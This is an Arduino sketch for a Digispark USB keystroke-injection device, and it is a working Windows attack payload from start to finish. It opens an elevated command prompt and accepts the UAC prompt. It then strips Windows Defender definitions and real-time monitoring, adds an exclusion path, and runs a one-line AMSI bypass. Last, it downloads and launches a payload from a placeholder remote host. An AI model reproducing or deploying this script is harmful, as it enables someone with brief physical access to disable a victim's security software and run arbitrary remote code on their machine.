#include "DigiKeyboard.h"

void setup() {}

void loop() {
	DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.delay(3000);
	// 3 second delay for device to register
	DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,41);
	// keyboard shortcut for search bar
	DigiKeyboard.delay(1700);
	DigiKeyboard.print("cmd");
	// searching for cmd prompt
	DigiKeyboard.delay(750);
	DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,MOD_SHIFT_LEFT,KEY_ENTER);
	// 'run as admin' keyboard shortcut
	DigiKeyboard.delay(2500);
	DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_Y);
	// bypass UAC prompt
	DigiKeyboard.delay(1500);
	DigiKeyboard.print("cd %userprofile%");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(100);
	DigiKeyboard.print("\"%ProgramFiles%\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true");
	// Removes all security definitions for windows defender and disables AV protection (credit to Dan Tentler)
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(100);
	DigiKeyboard.print("powershell");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(2500);
	DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath \"<define exclusion path here>\"");
	// Disables defender's 'real time monitoring' and sets exclusion path in event defender conducts a scan
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(100);
	DigiKeyboard.print("\"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"");
	// One line AMSI bypass (courtesy of Matt Graeber)
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(100);
	DigiKeyboard.print("iex (New-Object System.Net.WebClient).DownloadFile('http://<ipaddr>/<payload>','<path\\to\\payload>');Start-Process .\\\"<path\\to\\payload>\"\\");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(100);
	DigiKeyboard.print("exit");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// Exiting Powershell
	DigiKeyboard.delay(1000);
	DigiKeyboard.print("exit");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// End of Payload
}